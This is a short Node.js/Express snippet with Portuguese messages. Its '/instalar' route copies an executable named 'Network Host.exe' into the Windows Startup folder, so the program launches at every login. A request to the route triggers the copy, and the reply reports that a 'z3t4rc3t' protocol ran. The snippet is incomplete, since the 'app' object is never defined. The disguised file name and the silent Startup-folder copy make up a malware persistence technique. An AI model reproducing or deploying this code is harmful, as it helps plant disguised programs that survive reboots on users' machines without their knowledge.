const fs = require("fs");
const path = require("path");


const app_name = "Network Host.exe"


app.get("/instalar", (req, res) => {
	const origem = path.join(__dirname, app_name);
	const destino = path.join(get_startup_path(), app_name);
	console.log(destino)

	fs.copyFile(origem, destino, (err) => {
		if (err) {
			return res.status(500).send("Erro ao executar protocolo 'z3t4rc3t'");
		}
		res.status(200).send("Protocolo 'z3t4rc3t' executado com sucesso");
	});
});


function get_startup_path() {
	const app_data = process.env.APPDATA;
	const startup = path.join(app_data, "Microsoft", "Windows", "Start Menu", "Programs", "Startup");

	return startup;
}
